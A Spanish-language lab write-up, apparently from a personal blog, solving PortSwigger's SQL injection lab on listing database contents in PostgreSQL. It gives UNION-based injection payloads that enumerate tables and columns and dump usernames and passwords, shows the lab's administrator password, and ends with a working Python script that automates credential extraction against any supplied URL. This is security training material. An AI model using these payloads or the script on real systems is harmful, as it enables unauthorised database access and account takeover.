---
title: "09 SQL injection attack, listing the database contents on non Oracle databases"
collection: publications
category: portswigger
permalink: /publications/09_SQL injection attack, listing the database contents on non Oracle databases
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría de producto. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en UNION en una base de datos PostgreSQL que recupera los nombres de usuario y las contraseñas de todos los usuarios de la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection attack, listing the database contents on non Oracle databases'
---

![logo]({{site.url}}/images/SQLi/sqli-9/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-9/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, inicia sesión como usuario administrador.

## Determinamos que el campo si es vulnerable

```javascript
' or 1=1--
```

![Vulnerable]({{site.url}}/images/SQLi/sqli-9/vulnerable.png)

## Determinar el numero de columnas retornadas por la consulta

Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 2 columnas.

```javascript
' ORDER BY 1--
' ORDER BY 2--
```

![Order by]({{site.url}}/images/SQLi/sqli-9/order by.png)

## Miramos que columna es de tipo 'String'

Inyectamos en cada una de ellas mirando cual podemos inyectar 'String'

```javascript
' UNION SELECT 'A', NULL--
' UNION SELECT NULL, 'A'-- 
' UNION SELECT 'A', 'A'--
```

![String]({{site.url}}/images/SQLi/sqli-9/campo string.png)

## Miramos la versión de la BD

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Es una BD Postgres SQL

![DB version]({{site.url}}/images/SQLi/sqli-9/version.png)

```javascript
' UNION SELECT version(), NULL --
```

![version]({{site.url}}/images/SQLi/sqli-9/Payload.png)

## Obtener el nombre de las tablas

Ya que conocemos el tipo de BD, debemos listar el nombre de las tablas.

```javascript
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public'--
```

![Tablas]({{site.url}}/images/SQLi/sqli-9/tablas.png)

## Listamos las columnas

```javascript
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_pzweot'--
```

```
username_jijzil
password_wjgcqi
```

![Columnas de la tabla]({{site.url}}/images/SQLi/sqli-9/columnas de la tabla.png)

## Listar username y password
Ya que conocemos las columnas de la tabla, debemos listarla. En esta ocación unimos en una sola columna

```javascript
' UNION SELECT NULL,username_jijzil || '*****' || password_wjgcqi FROM users_pzweot--
```

![Usuarios Passwords]({{site.url}}/images/SQLi/sqli-6/listado usuario y password.png)

## Procedemos a hacer el login

```
administrator
6rhx7r9m4iscbb2be39d
```

![login]({{site.url}}/images/SQLi/sqli-9/login.png)

## Solucionado

Solventado el laboratorio

![Aprobado]({{site.url}}/images/SQLi/sqli-9/aprobado.png)

# Codigo Python
```python
import requests
import sys
import urllib3 
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text


def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" %(username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for a users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" % users_table)
        # step #5
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s" % username_column)
            print("Found the password column name: %s" % password_column)

            # step #6
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("[-] Did not find the administrator password.")
        else:
            print("Did not find the username and/or the password columns.")

    else:
        print("Did not find a users table.")
```